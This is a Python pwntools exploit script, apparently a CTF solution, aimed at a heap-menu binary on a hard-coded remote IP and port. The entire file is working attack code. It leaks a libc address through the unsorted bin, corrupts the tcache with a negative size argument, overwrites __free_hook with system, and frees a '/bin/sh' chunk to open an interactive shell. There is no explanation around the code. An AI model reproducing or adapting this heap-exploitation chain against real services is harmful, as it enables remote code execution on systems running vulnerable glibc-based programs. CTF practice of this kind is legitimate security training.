from pwn import*
#context.log_level ='DEBUG'
p = process('./main')
p = remote('123.57.209.176',30774)
def menu(ch):
	p.sendlineafter('>>',str(ch))
def new(size,content):
	menu(1)
	p.sendlineafter('Size:',str(size))
	p.sendafter('Content',content)
def show(index):
	menu(2)
	p.sendlineafter('Index',str(index))
def free(index):
	menu(3)
	p.sendlineafter('Index',str(index))
def N(size,sz,content):
	menu(1)
	p.sendlineafter('Size:',str(size))
	p.sendlineafter('Size:',str(sz))
	p.sendafter('Content',content)
libc =ELF('./libc-2.31.so')
for i in range(8):
	new(0x80,'FMYY\n')
for i in range(7):
	free(7 - i)
free(0)
N(0x200,1,'\xE0') #0
show(0)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 352 - 0x10
log.info('LIBC:\t' + hex(libc_base))

new(0x70,'FMYY\n') #1
new(0x60,'FMYY\n') #2
new(0x50,'FMYY\n') #3
new(0x50,'FMYY\n') #4
new(0x50,'FMYY\n') #5
free(3)
free(5)
free(4)
N(-0xBF,0x40,'FMYY\n') #3
new(0x50,p64(libc_base + libc.sym['__free_hook']) + '\n') #4
new(0x50,'/bin/sh\x00\n') #5
new(0x50,p64(libc_base + libc.sym['system']) + '\n')
free(5)

p.interactive()
